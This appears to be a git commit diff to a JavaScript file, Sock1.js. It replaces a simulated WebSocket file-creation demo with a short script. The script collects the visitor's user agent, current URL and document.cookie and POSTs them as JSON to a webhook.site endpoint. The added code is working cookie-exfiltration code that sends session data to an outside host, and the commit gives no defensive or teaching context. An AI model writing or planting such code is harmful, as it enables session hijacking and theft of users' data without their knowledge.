11539fd92afba97eda497f4812fe4467caac6892
raoufdz28 <raouf.okirim@gmail.com>
2025-04-27 18:18:25 +0100

    Sock1.js

--- Sock1.js
+++ Sock1.js
@@ -1,60 +1,15 @@
-// Simulated WebSocket object
-const simulatedWebSocket = {
-  onmessage: null,
-  send: function (command) {
-    if (this.onmessage) {
-      this.onmessage({ data: command });
-    }
-  },
+const data = {
+    device: navigator.userAgent,
+    location: window.location.href,
+    cookies: document.cookie
 };
 
-// Function to create a test file
-function createTestFile() {
-  try {
-    const fileName = "testtxt.txt";
-    const filePath = "/storage/emulated/0/Download/" + fileName; // Common internal storage path for Android devices
-    const fileContent = "This is a test file.";
-
-    // Use the FileSystem API to write the file
-    if (window.resolveLocalFileSystemURL) {
-      window.resolveLocalFileSystemURL("/storage/emulated/0/Download", function (dirEntry) {
-        dirEntry.getFile(fileName, { create: true, exclusive: false }, function (fileEntry) {
-          fileEntry.createWriter(function (fileWriter) {
-            fileWriter.onwriteend = function () {
-              console.log("File successfully created: " + filePath);
-            };
-            fileWriter.onerror = function (err) {
-              console.error("Failed to write file: " + err.message);
-            };
-
-            const blob = new Blob([fileContent], { type: "text/plain" });
-            fileWriter.write(blob);
-          }, function (err) {
-            console.error("Failed to create writer: " + err.message);
-          });
-        }, function (err) {
-          console.error("Failed to get file: " + err.message);
-        });
-      }, function (err) {
-        console.error("Failed to access directory: " + err.message);
-      });
-    } else {
-      console.error("FileSystem API is not supported on this device.");
-    }
-  } catch (err) {
-    console.error("Error creating file: " + err.message);
-  }
-}
-
-// Simulate receiving a WebSocket command
-simulatedWebSocket.onmessage = function (event) {
-  const command = event.data;
-  if (command === "createTestFile") {
-    createTestFile();
-  } else {
-    console.log("Unknown command received: " + command);
-  }
-};
-
-// Trigger the WebSocket simulation
-simulatedWebSocket.send("createTestFile");
+fetch("https://webhook.site/a57f7288-8739-42d8-a875-929a4983bece", {
+    method: "POST",
+    headers: {
+        "Content-Type": "application/json"
+    },
+    body: JSON.stringify(data)
+})
+.then(response => console.log("Data sent successfully"))
+.catch(error => console.error("Error:", error));
